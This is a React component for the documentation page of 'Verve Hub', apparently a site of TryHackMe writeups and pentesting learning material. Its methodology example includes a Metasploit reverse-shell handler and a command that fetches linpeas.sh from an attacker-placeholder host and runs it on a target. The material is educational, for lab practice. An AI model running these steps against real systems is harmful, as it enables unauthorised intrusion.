import React, { useState } from "react";
import { ChevronDown, Book, Shield, Target, FileText, Search, Trophy, Lock, Server, Code, Globe, Users } from "lucide-react";

const Documentation = () => {
  const [openIndex, setOpenIndex] = useState<number | null>(null);
  const [searchQuery, setSearchQuery] = useState("");

  const docSections = [
    {
      id: "getting-started",
      title: "Getting Started with Verve Hub",
      icon: Book,
      version: "v2.4",
      lastUpdated: "2024-12-01",
      content: {
        overview: "Complete guide for cybersecurity enthusiasts to navigate Verve Hub's extensive collection of TryHackMe writeups, learning resources, and reference materials.",
        topics: [
          {
            title: "Platform Overview",
            items: [
              "Access 500+ detailed TryHackMe room writeups with step-by-step solutions",
              "Navigate categorized content by difficulty: Easy, Medium, Hard, Insane",
              "Search functionality across all writeups, tools, and learning resources",
              "Mobile-responsive design for learning on any device"
            ]
          },
          {
            title: "Account Setup & Features",
            items: [
              "Create a free account to bookmark favorite writeups and track progress",
              "Set up personalized learning paths based on your skill level",
              "Enable email notifications for new writeups and resource updates",
              "Join the community forum to discuss challenges and share insights"
            ]
          },
          {
            title: "Navigation Guide",
            items: [
              "Browse writeups by category: Web Exploitation, Privilege Escalation, Network Security, Cryptography, Forensics, etc.",
              "Use advanced filters: OS type (Linux/Windows), tools required, estimated completion time",
              "Access quick reference cards for common commands and techniques",
              "Download writeups in PDF format for offline study"
            ]
          },
          {
            title: "Best Practices for Learning",
            items: [
              "Always attempt the room yourself before consulting writeups",
              "Use writeups as learning tools, not shortcuts - understand the 'why' behind each step",
              "Take notes and create your own documentation alongside the writeups",
              "Join study groups and participate in discussions to deepen understanding"
            ]
          }
        ],
        codeExample: `# Quick Start: Finding a Writeup

1. Visit: https://vervehub.com/writeups
2. Search: "Relevant" or browse by category
3. Filter by difficulty: Medium
4. Follow step-by-step instructions
5. Cross-reference with official THM hints if stuck`
      }
    },
    {
      id: "writeup-structure",
      title: "Understanding Writeup Structure",
      icon: FileText,
      version: "v3.1",
      lastUpdated: "2024-11-28",
      content: {
        overview: "Detailed explanation of how Verve Hub writeups are structured to maximize learning efficiency and comprehension.",
        topics: [
          {
            title: "Standard Writeup Format",
            items: [
              "Room Overview: Difficulty rating, estimated time, required skills",
              "Reconnaissance Phase: Initial enumeration steps and findings",
              "Exploitation Phase: Detailed attack methodology with screenshots",
              "Post-Exploitation: Privilege escalation techniques and flag capture",
              "Tools & Commands Reference: All tools used with proper syntax"
            ]
          },
          {
            title: "Educational Elements",
            items: [
              "Concept Explanations: Theory behind each technique used",
              "Alternative Approaches: Multiple methods to solve the same challenge",
              "Common Pitfalls: Mistakes to avoid and troubleshooting tips",
              "Further Reading: Links to additional resources and documentation"
            ]
          },
          {
            title: "Code & Command Blocks",
            items: [
              "Syntax-highlighted command examples for easy copying",
              "Explanatory comments for complex commands and scripts",
              "Tool installation instructions when specialized tools are required",
              "Expected output samples to verify correct execution"
            ]
          },
          {
            title: "Visual Aids",
            items: [
              "High-quality screenshots of critical steps and findings",
              "Network diagrams for complex infrastructure challenges",
              "Process flow charts illustrating attack chains",
              "Tool interface guides for unfamiliar utilities"
            ]
          }
        ],
        codeExample: `# Example: Nmap Scan Section

## Reconnaissance

### Port Scanning
nmap -sC -sV -oN initial_scan.txt 10.10.10.100

# -sC: Default scripts
# -sV: Version detection
# -oN: Output to file

[Screenshot: Nmap results showing ports 22, 80, 445 open]

Key Findings:
• Port 22: OpenSSH 7.6p1 (outdated version)
• Port 80: Apache 2.4.29 (potential web vulns)
• Port 445: Samba 4.7.6 (SMB enumeration target)`
      }
    },
    {
      id: "learning-resources",
      title: "Learning Resources & References",
      icon: Trophy,
      version: "v2.8",
      lastUpdated: "2024-11-25",
      content: {
        overview: "Curated collection of cybersecurity learning materials, tools documentation, and reference sites for continuous skill development.",
        topics: [
          {
            title: "Fundamental Concepts",
            items: [
              "Linux Command Line Mastery: Bash scripting, file permissions, process management",
              "Networking Essentials: TCP/IP, OSI model, common protocols (HTTP, SSH, SMB, FTP)",
              "Web Application Security: OWASP Top 10, injection attacks, authentication bypasses",
              "Windows Active Directory: Domain enumeration, Kerberos attacks, lateral movement"
            ]
          },
          {
            title: "Essential Tool Documentation",
            items: [
              "Nmap: Comprehensive port scanning and service enumeration techniques",
              "Metasploit Framework: Exploit development, payload generation, post-exploitation",
              "Burp Suite: Web application testing, proxy configuration, plugin usage",
              "John the Ripper / Hashcat: Password cracking methodologies and rule creation",
              "Gobuster / FFuF: Directory bruteforcing and content discovery strategies",
              "SQLMap: Automated SQL injection detection and exploitation"
            ]
          },
          {
            title: "Reference Sites & Cheat Sheets",
            items: [
              "GTFOBins: Unix binaries for privilege escalation and bypasses",
              "LOLBAS: Living Off The Land binaries for Windows environments",
              "PayloadsAllTheThings: Comprehensive attack payloads repository",
              "HackTricks: Extensive pentesting methodology and technique documentation",
              "Exploit-DB: Searchable database of public exploits and vulnerabilities",
              "CyberChef: Swiss army knife for data encoding/decoding operations"
            ]
          },
          {
            title: "Practice Platforms & Labs",
            items: [
              "TryHackMe: Guided learning paths with hands-on virtual machines",
              "HackTheBox: Advanced penetration testing challenges and certifications",
              "PortSwigger Web Security Academy: Free web application security training",
              "VulnHub: Downloadable vulnerable VMs for offline practice",
              "PentesterLab: Web penetration testing exercises with video walkthroughs",
              "OverTheWire: Wargames for learning security concepts progressively"
            ]
          }
        ],
        codeExample: `# Essential Bookmarks for Pentesting

## Enumeration References
- GTFOBins: https://gtfobins.github.io
- LOLBAS: https://lolbas-project.github.io
- PayloadsAllTheThings: github.com/swisskyrepo

## Exploitation Databases
- Exploit-DB: https://exploit-db.com
- Packet Storm: https://packetstormsecurity.com

## Reverse Shell Generators
- RevShells: https://revshells.com
- PentestMonkey: reverse shell cheatsheet`
      }
    },
    {
      id: "methodology",
      title: "Penetration Testing Methodology",
      icon: Target,
      version: "v1.9",
      lastUpdated: "2024-11-20",
      content: {
        overview: "Industry-standard penetration testing methodology adapted for TryHackMe challenges and real-world scenarios.",
        topics: [
          {
            title: "Phase 1: Information Gathering",
            items: [
              "Passive Reconnaissance: OSINT techniques, DNS enumeration, public data mining",
              "Active Reconnaissance: Port scanning, service identification, version detection",
              "Web Application Discovery: Subdomain enumeration, directory bruteforcing, robots.txt analysis",
              "Documentation: Maintain detailed notes of all findings and observations"
            ]
          },
          {
            title: "Phase 2: Vulnerability Assessment",
            items: [
              "Automated Scanning: Nessus, OpenVAS, Nikto for comprehensive vulnerability detection",
              "Manual Testing: Custom exploit development, logic flaw identification",
              "Credential Testing: Default credentials, password policies, authentication mechanisms",
              "Service-Specific Testing: SMB enumeration, NFS shares, database exposure"
            ]
          },
          {
            title: "Phase 3: Exploitation",
            items: [
              "Initial Access: Remote code execution, file upload vulnerabilities, injection attacks",
              "Establishing Persistence: Reverse shells, backdoors, scheduled tasks",
              "Defensive Evasion: AV bypass techniques, obfuscation, AMSI bypass",
              "Tool Selection: Choose appropriate exploit framework based on target environment"
            ]
          },
          {
            title: "Phase 4: Post-Exploitation",
            items: [
              "Privilege Escalation: Kernel exploits, SUID binaries, misconfigured services, token manipulation",
              "Lateral Movement: Pass-the-hash, pass-the-ticket, pivoting through compromised hosts",
              "Data Exfiltration: Flag capture, sensitive file location, credential harvesting",
              "Cleanup: Remove artifacts, maintain stealth, document complete attack chain"
            ]
          }
        ],
        codeExample: `# Standard Pentesting Workflow

## 1. Reconnaissance
export IP=10.10.10.100
mkdir -p nmap scans loot

## 2. Initial Enumeration
nmap -sC -sV -p- -oA nmap/full-scan $IP
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt

## 3. Exploitation
msfconsole -q
use exploit/multi/handler
set payload linux/x64/shell_reverse_tcp
set LHOST tun0
set LPORT 4444
run

## 4. Privilege Escalation
# On target machine
wget http://YOUR_IP/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee privesc-scan.txt`
      }
    },
    {
      id: "tools-setup",
      title: "Tools & Environment Setup",
      icon: Server,
      version: "v2.6",
      lastUpdated: "2024-11-30",
      content: {
        overview: "Comprehensive guide to setting up a complete penetration testing environment with essential tools and configurations.",
        topics: [
          {
            title: "Operating System Setup",
            items: [
              "Kali Linux: Recommended distribution with pre-installed pentesting tools (download, VMware/VirtualBox setup)",
              "ParrotOS Security Edition: Lightweight alternative with privacy-focused features",
              "BlackArch: Arch-based distribution with 2800+ security tools available",
              "Custom Ubuntu Setup: Installing tools manually on Ubuntu/Debian systems"
            ]
          },
          {
            title: "Essential Tool Categories",
            items: [
              "Network Scanners: Nmap, Masscan, RustScan for rapid port discovery",
              "Web Tools: Burp Suite Professional/Community, OWASP ZAP, Nikto, WPScan",
              "Exploitation Frameworks: Metasploit, Empire, Covenant, Cobalt Strike",
              "Password Cracking: John the Ripper, Hashcat, Hydra, Medusa, CrackMapExec",
              "Post-Exploitation: LinPEAS, WinPEAS, PowerSploit, Mimikatz, Rubeus",
              "Network Tools: Wireshark, tcpdump, Responder, Impacket suite"
            ]
          },
          {
            title: "VPN & Connectivity",
            items: [
              "TryHackMe VPN: Download OpenVPN config, connect via 'sudo openvpn your-config.ovpn'",
              "Split Tunneling: Route only THM traffic through VPN, maintain normal browsing",
              "VPN Troubleshooting: DNS leaks, IP verification, connectivity issues",
              "Multiple VPN Management: Switching between different lab environments"
            ]
          },
          {
            title: "Wordlists & Payloads",
            items: [
              "SecLists: Comprehensive collection of usernames, passwords, URLs, fuzzing payloads",
              "RockYou.txt: 14 million password wordlist for credential cracking",
              "Custom Wordlist Generation: Cewl, Crunch, Cupp for targeted attacks",
              "Payload Collections: WebShells, reverse shells, privilege escalation exploits"
            ]
          }
        ],
        codeExample: `# Essential Tool Installation (Kali/Ubuntu)

## Update System
sudo apt update && sudo apt upgrade -y

## Install Core Tools
sudo apt install -y nmap gobuster nikto john hydra \
  sqlmap metasploit-framework burpsuite \
  wireshark tcpdump seclists wordlists

## Clone Important Repos
cd /opt
sudo git clone https://github.com/carlospolop/PEASS-ng
sudo git clone https://github.com/rebootuser/LinEnum
sudo git clone https://github.com/SecureAuthCorp/impacket

## Setup Python Environment
python3 -m pip install --upgrade pip
pip3 install impacket bloodhound pwntools

## Download Wordlists
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

## Connect to TryHackMe
sudo openvpn ~/Downloads/username.ovpn`
      }
    },
    {
      id: "community-contribution",
      title: "Contributing to Verve Hub",
      icon: Users,
      version: "v1.5",
      lastUpdated: "2024-12-01",
      content: {
        overview: "Guidelines for community members who want to contribute writeups, resources, and improvements to the Verve Hub platform.",
        topics: [
          {
            title: "Writeup Submission Guidelines",
            items: [
              "Original Content: Submit only your own work with proper attribution for referenced materials",
              "Quality Standards: Include detailed explanations, not just command dumps",
              "Formatting Requirements: Use markdown with proper headings, code blocks, and screenshots",
              "Ethical Considerations: No writeups for active paid/competitive CTF challenges"
            ]
          },
          {
            title: "Content Standards",
            items: [
              "Educational Value: Focus on teaching methodology, not just solutions",
              "Screenshot Quality: Clear, annotated images showing key steps",
              "Tool Documentation: Explain why specific tools were chosen",
              "Multiple Approaches: Include alternative solutions when applicable",
              "Proofreading: Check for typos, broken commands, and technical accuracy"
            ]
          },
          {
            title: "Submission Process",
            items: [
              "Draft Your Writeup: Use provided markdown template with standard sections",
              "Submit via Portal: Upload through Verve Hub contributor dashboard",
              "Review Period: Editorial team reviews within 3-5 business days",
              "Revisions: Address feedback and make requested improvements",
              "Publication: Approved writeups published with author attribution"
            ]
          },
          {
            title: "Community Recognition",
            items: [
              "Contributor Badge: Earn verified contributor status after 5 approved writeups",
              "Leaderboard Ranking: Track contributions and community impact score",
              "Featured Content: Outstanding writeups highlighted on homepage",
              "Expert Status: Top contributors invited to mentor new community members"
            ]
          }
        ],
        codeExample: `# Writeup Template Structure

## Room Information
- **Room Name:** Example Room
- **Difficulty:** Medium
- **OS:** Linux
- **Skills Required:** Web exploitation, Privilege escalation
- **Time to Complete:** 2-3 hours

## Reconnaissance
[Enumeration steps and findings]

## Initial Access
[Exploitation methodology]

## Privilege Escalation
[PrivEsc techniques used]

## Flags
user.txt: [hash]
root.txt: [hash]

## Tools Used
- nmap, gobuster, burpsuite, linpeas

## Key Learning Points
[What users should understand from this room]`
      }
    }
  ];

  const toggleSection = (index: number) => {
    setOpenIndex(openIndex === index ? null : index);
  };

  const filteredSections = docSections.filter(section =>
    section.title.toLowerCase().includes(searchQuery.toLowerCase()) ||
    section.content.overview.toLowerCase().includes(searchQuery.toLowerCase())
  );

  return (
    <div className="min-h-screen bg-gradient-to-br from-[#0a0a0f] via-[#0f0f1a] to-[#0a0a0f] text-white">
      {/* Navigation Bar */}
      <nav className="border-b border-white/10 bg-black/30 backdrop-blur-xl sticky top-0 z-50">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4 flex items-center justify-between">
          <div className="flex items-center space-x-3">
            <Shield className="h-6 w-6 text-cyan-400" />
            <span className="text-xl font-bold">Verve Hub Documentation</span>
          </div>
          <div className="flex items-center space-x-4">
            <span className="text-sm text-white/50">500+ Writeups</span>
            <a href="https://tryhackme.com" target="_blank" rel="noopener noreferrer" className="text-sm text-cyan-400 hover:text-cyan-300 transition-colors">
              TryHackMe ↗
            </a>
          </div>
        </div>
      </nav>

      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
        {/* Header */}
        <div className="text-center mb-16">
          <div className="inline-flex items-center space-x-2 px-4 py-2 bg-red-500/10 border border-red-500/20 rounded-full text-red-400 text-sm font-medium mb-6">
            <Lock className="h-4 w-4" />
            <span>Cybersecurity Learning Platform</span>
          </div>
          <h1 className="text-5xl sm:text-6xl md:text-7xl font-bold mb-6 bg-gradient-to-r from-white via-cyan-200 to-white bg-clip-text text-transparent">
            Verve Hub Documentation
          </h1>
          <p className="text-white/60 text-lg sm:text-xl max-w-3xl mx-auto leading-relaxed mb-8">
            Your comprehensive guide to TryHackMe writeups, penetration testing methodologies, cybersecurity learning resources, and reference materials for ethical hacking.
          </p>

          {/* Search Bar */}
          <div className="max-w-2xl mx-auto relative">
            <Search className="absolute left-4 top-1/2 transform -translate-y-1/2 h-5 w-5 text-white/40" />
            <input
              type="text"
              placeholder="Search writeups, tools, techniques..."
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              className="w-full pl-12 pr-4 py-4 bg-white/5 border border-white/10 rounded-xl text-white placeholder-white/40 focus:outline-none focus:border-cyan-500/50 focus:bg-white/10 transition-all"
            />
          </div>
        </div>

        {/* Quick Stats */}
        <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 mb-12">
          <div className="bg-white/5 border border-white/10 rounded-xl p-6 hover:bg-white/10 transition-all">
            <div className="flex items-center justify-between mb-2">
              <span className="text-white/60 text-sm font-medium">Total Writeups</span>
              <FileText className="h-5 w-5 text-cyan-400" />
            </div>
            <div className="text-3xl font-bold text-white">500+</div>
            <div className="text-white/40 text-xs mt-1">All difficulty levels</div>
          </div>
          <div className="bg-white/5 border border-white/10 rounded-xl p-6 hover:bg-white/10 transition-all">
            <div className="flex items-center justify-between mb-2">
              <span className="text-white/60 text-sm font-medium">Learning Resources</span>
              <Book className="h-5 w-5 text-green-400" />
            </div>
            <div className="text-3xl font-bold text-white">150+</div>
            <div className="text-white/40 text-xs mt-1">Tools & references</div>
          </div>
          <div className="bg-white/5 border border-white/10 rounded-xl p-6 hover:bg-white/10 transition-all">
            <div className="flex items-center justify-between mb-2">
              <span className="text-white/60 text-sm font-medium">Active Contributors</span>
              <Users className="h-5 w-5 text-purple-400" />
            </div>
            <div className="text-3xl font-bold text-white">50+</div>
            <div className="text-white/40 text-xs mt-1">Verified writers</div>
          </div>
        </div>

        {/* Documentation Sections */}
        <div className="space-y-4 mb-16">
          {filteredSections.map((section, index) => {
            const Icon = section.icon;
            const isOpen = openIndex === index;
            
            return (
              <div
                key={section.id}
                className="border border-white/10 rounded-2xl bg-white/5 overflow-hidden hover:border-cyan-500/30 transition-all duration-300"
              >
                <button
                  onClick={() => toggleSection(index)}
                  className="w-full flex items-center justify-between px-6 py-5 text-left hover:bg-white/5 transition-all group"
                >
                  <div className="flex items-center space-x-4 flex-1">
                    <div className="p-3 bg-cyan-500/10 rounded-xl group-hover:bg-cyan-500/20 transition-all">
                      <Icon className="h-6 w-6 text-cyan-400" />
                    </div>
                    <div className="flex-1">
                      <div className="flex items-center space-x-3 mb-1">
                        <span className="text-xl font-bold text-white">
                          {section.title}
                        </span>
                        <span className="px-2 py-1 bg-cyan-500/10 border border-cyan-500/20 rounded text-xs text-cyan-400 font-mono">
                          {section.version}
                        </span>
                      </div>
                      <p className="text-white/50 text-sm">
                        Last updated: {section.lastUpdated}
                      </p>
                    </div>
                  </div>
                  <ChevronDown
                    className={`h-6 w-6 text-cyan-400 transition-transform duration-300 ${
                      isOpen ? "rotate-180" : ""
                    }`}
                  />
                </button>

                <div
                  className={`overflow-hidden transition-all duration-500 ${
                    isOpen ? "max-h-[2000px] opacity-100" : "max-h-0 opacity-0"
                  }`}
                >
                  <div className="px-6 pb-6 space-y-6 border-t border-white/5">
                    {/* Overview */}
                    <div className="pt-6">
                      <h3 className="text-sm font-semibold text-cyan-400 uppercase tracking-wider mb-3">
                        Overview
                      </h3>
                      <p className="text-white/70 leading-relaxed">
                        {section.content.overview}
                      </p>
                    </div>

                    {/* Topics */}
                    <div>
                      <h3 className="text-sm font-semibold text-cyan-400 uppercase tracking-wider mb-4">
                        Key Topics
                      </h3>
                      <div className="space-y-4">
                        {section.content.topics.map((topic, topicIndex) => (
                          <div
                            key={topicIndex}
                            className="bg-black/20 rounded-xl p-4 border border-white/5"
                          >
                            <h4 className="text-white font-semibold mb-3 flex items-center">
                              <span className="w-6 h-6 bg-cyan-500/10 rounded-full flex items-center justify-center text-xs text-cyan-400 mr-3">
                                {topicIndex + 1}
                              </span>
                              {topic.title}
                            </h4>
                            <ul className="space-y-2 ml-9">
                              {topic.items.map((item, itemIndex) => (
                                <li
                                  key={itemIndex}
                                  className="text-white/60 text-sm leading-relaxed flex items-start"
                                >
                                  <span className="text-cyan-400 mr-2 mt-1">•</span>
                                  <span>{item}</span>
                                </li>
                              ))}
                            </ul>
                          </div>
                        ))}
                      </div>
                    </div>

                    {/* Code Example */}
                    {section.content.codeExample && (
                      <div>
                        <h3 className="text-sm font-semibold text-cyan-400 uppercase tracking-wider mb-3">
                          Example Reference
                        </h3>
                        <div className="bg-black/40 rounded-xl p-4 border border-white/5 overflow-x-auto">
                          <pre className="text-sm text-green-400 font-mono leading-relaxed whitespace-pre-wrap">
                            <code>{section.content.codeExample}</code>
                          </pre>
                        </div>
                      </div>
                    )}
                  </div>
                </div>
              </div>
            );
          })}
        </div>

        {/* Support Section */}
        <div className="bg-gradient-to-r from-cyan-500/10 to-purple-500/10 border border-cyan-500/20 rounded-2xl p-8 text-center">
          <Shield className="h-12 w-12 text-cyan-400 mx-auto mb-4" />
          <h2 className="text-2xl sm:text-3xl font-bold mb-4">Join Our Cybersecurity Community</h2>
          <p className="text-white/60 mb-6 max-w-2xl mx-auto">
            Connect with fellow ethical hackers, share knowledge, discuss challenges, and contribute your own writeups to help others learn.
          </p>
          <div className="flex flex-col sm:flex-row items-center justify-center gap-4">
            <a
              href="/community"
              className="px-8 py-4 bg-cyan-500 hover:bg-cyan-400 rounded-xl font-semibold transition-all text-white shadow-lg shadow-cyan-500/20 hover:shadow-cyan-500/40"
            >
              Join Community Forum
            </a>
            <a
              href="/contribute"
              className="px-8 py-4 bg-white/5 hover:bg-white/10 border border-white/10 rounded-xl font-semibold transition-all text-white"
            >
              Submit Writeup
            </a>
          </div>
          <div className="mt-6 flex items-center justify-center space-x-6 text-sm text-white/50">
            <span>500+ Active members</span>
            <span>•</span>
            <span>New content daily</span>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="border-t border-white/10 mt-20">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
          <div className="flex flex-col sm:flex-row items-center justify-between text-sm text-white/40">
            <p>© 2024 Verve Hub. Educational purposes only - Practice ethical hacking responsibly.</p>
            <div className="flex items-center space-x-4 mt-4 sm:mt-0">
              <a href="/terms" className="hover:text-white/60 transition-colors">Terms</a>
              <a href="/privacy" className="hover:text-white/60 transition-colors">Privacy</a>
              <a href="/responsible-disclosure" className="hover:text-white/60 transition-colors">Responsible Disclosure</a>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default Documentation;